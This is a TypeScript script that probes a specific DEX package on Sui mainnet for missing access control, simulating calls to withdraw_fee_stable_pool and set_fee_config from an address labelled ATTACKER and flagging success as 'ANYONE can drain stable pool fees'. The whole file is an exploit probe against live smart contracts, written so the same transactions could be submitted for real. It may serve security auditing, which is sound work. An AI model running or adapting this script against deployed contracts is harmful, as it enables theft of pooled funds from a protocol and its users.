import { SuiClient } from "@mysten/sui/client";
import { Transaction } from "@mysten/sui/transactions";
import { bcs } from "@mysten/sui/bcs";

const client = new SuiClient({ url: "https://fullnode.mainnet.sui.io:443" });
const PKG = "0xb24b6789e088b876afabca733bed2299fbc9e2d6369be4d1acfa17d8145454d9";
const DEX_STABLE_INFO = "0x5a7eca40df453efe6bb1feae99e5b8fc072d1252cbd1979eb187d625dc9b47c9";
const ATTACKER = "0xdeadbeef00000000000000000000000000000000000000000000000000000000";

async function main() {
  // Try withdraw_fee_stable_pool which just needs Dex_Stable_Info
  // This is the most dangerous: drain all accumulated fees
  {
    const tx = new Transaction();
    tx.moveCall({
      target: `${PKG}::stable_swap::withdraw_fee_stable_pool`,
      typeArguments: [
        "0x5d4b302506645c37ff133b98c4b50a5ae14841659738d6d733d59d0d217a93bf::coin::COIN",
        "0xc060006111016b8a020ad5b33834984a437aaa7d3c74c18e09a95d48aceab08c::coin::COIN"
      ],
      arguments: [
        tx.object(DEX_STABLE_INFO),
      ],
    });
    const result = await client.devInspectTransactionBlock({
      transactionBlock: tx,
      sender: ATTACKER,
    });
    const status = result.effects.status;
    console.log("=== stable_swap::withdraw_fee_stable_pool ===");
    console.log("Status:", status.status);
    if (status.status === "success") {
      console.log("!!! CRITICAL: ANYONE can drain stable pool fees !!!");
      console.log("Mutations:", result.effects.mutatedObjects?.length);
    } else {
      console.log("Error:", status.error);
    }
  }
  
  // Also try set_fee_config directly - maybe different type args needed?
  {
    // set_fee_config is NOT generic - no type args needed
    // Let me try with current sender != admin to confirm auth error
    const tx2 = new Transaction();
    tx2.moveCall({
      target: `${PKG}::stable_swap::set_fee_config`,
      arguments: [
        tx2.pure(bcs.u64().serialize(BigInt(100))),
        tx2.pure(bcs.u64().serialize(BigInt(100))),
        tx2.object(DEX_STABLE_INFO),
      ],
    });
    const result2 = await client.devInspectTransactionBlock({
      transactionBlock: tx2,
      sender: ATTACKER,
    });
    const status2 = result2.effects.status;
    console.log("\n=== stable_swap::set_fee_config (bcs) ===");
    console.log("Status:", status2.status);
    if (status2.status === "success") {
      console.log("!!! CRITICAL SUCCESS !!!");
    } else {
      console.log("Error:", status2.error);
    }
  }
}
main();
